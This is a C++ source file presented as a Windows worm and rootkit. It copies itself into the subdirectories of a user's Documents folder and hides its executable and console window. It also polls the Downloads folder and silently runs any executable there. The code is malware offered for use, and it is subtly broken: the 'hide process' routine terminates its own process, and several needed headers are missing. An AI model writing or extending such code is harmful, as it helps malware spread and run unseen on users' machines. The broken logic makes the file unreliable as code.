#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>

namespace fs = std::filesystem;
// Function to hide the process by modifying process attributes
void hideProcess() {
    HWND hwnd = FindWindowA(NULL, "ConsoleWindowClass"); // Assuming the window title of the console application is "ConsoleWindowClass"
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE); // Hide the console window
    }
}

// Function to enumerate processes and hide the worm's process
void hideWormProcess() {
    // Get the process ID of the current process (worm)
    DWORD currentProcessId = GetCurrentProcessId();

    // Create a snapshot of the current processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }

    // Enumerate through the processes
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        // Check if the process ID matches the current process (worm)
        if (pe32.th32ProcessID == currentProcessId) {
            // Open the process with all access rights
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                // Terminate the process
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

// Function to hide the worm's executable file
void hideWormFile(const std::string& wormPath) {
    // Hide the file by setting its attributes to hidden
    DWORD attributes = GetFileAttributes(wormPath.c_str());
    if (attributes != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributes(wormPath.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
    }
}
// Function to replicate the worm to new locations with a different name
void replicateWorm(const std::string& sourcePath, const std::string& destinationDirectory) {
    std::string destinationPath = destinationDirectory + "\\worm.exe";
    std::ifstream sourceFile(sourcePath, std::ios::binary);
    std::ofstream destinationFile(destinationPath, std::ios::binary);
    destinationFile << sourceFile.rdbuf();
}

// Function to execute a downloaded file with evasion techniques
void executeDownload(const std::string& filePath) {
    // Use Windows API to execute the file with evasion techniques
    // For example, you could inject the code into a legitimate process
    // or utilize obfuscation techniques to avoid detection
    ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
}

// Function prototype for isValidExecutable from DLL
typedef bool(*IsValidExecutableFunc)(const std::string&);

// Function to monitor downloads and execute them with evasion techniques
void monitorDownloads(const std::string& downloadDirectory) {
    // Load the DLL
    HINSTANCE dllHandle = LoadLibrary("isValidExecutable.dll");
    if (dllHandle == NULL) {
        std::cerr << "Failed to load DLL." << std::endl;
        return;
    }

    // Get the function pointer for isValidExecutable from the DLL
    IsValidExecutableFunc isValidExecutable = (IsValidExecutableFunc)GetProcAddress(dllHandle, "isValidExecutable");
    if (isValidExecutable == NULL) {
        std::cerr << "Failed to get function pointer." << std::endl;
        FreeLibrary(dllHandle);
        return;
    }

    while (true) {
        // Monitor the download directory for new files
        for (const auto& entry : fs::directory_iterator(downloadDirectory)) {
            if (fs::is_regular_file(entry.path())) {
                std::string filePath = entry.path().string();
                if (isValidExecutable(filePath)) {
                    executeDownload(filePath);
                }
            }
        }
        // Add delay to reduce resource consumption
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    // Free the DLL handle
    FreeLibrary(dllHandle);
}

// Function to start the worm's activities
void startWorm(const std::string& initialDirectory) {
    // Replicate worm to new locations with different names
    std::vector<std::string> targetDirectories;
    for (const auto& entry : fs::directory_iterator(initialDirectory)) {
        if (fs::is_directory(entry.path())) {
            targetDirectories.push_back(entry.path().string());
        }
    }
    for (const auto& directory : targetDirectories) {
        replicateWorm("worm.exe", directory);
    }
    
    // Start monitoring downloads for automatic execution
    std::thread downloadThread(monitorDownloads, "C:\\Downloads");
    downloadThread.detach();
}

int rootkitMain() {
    // Start the worm's activities in the current directory
    startWorm("C:\\Users\\User\\Documents");

    // Hide the process
    hideProcess();

    // Hide the worm's process
    hideWormProcess();

    // Hide the worm's executable file
    hideWormFile("C:\\Users\\User\\Documents\\worm.exe");

    // For demonstration purposes, this rootkit function will just run indefinitely
    while (true) {
        // Add additional rootkit functionality here if needed
        
        // Sleep to reduce CPU usage
        Sleep(1000);
    }

    // In a real rootkit implementation, this function may never return
    // or it may return an exit code indicating success or failure
    return 0;
}

// Entry point of the rootkit
int main() {
    // Run the rootkit main function
    return rootkitMain();
}
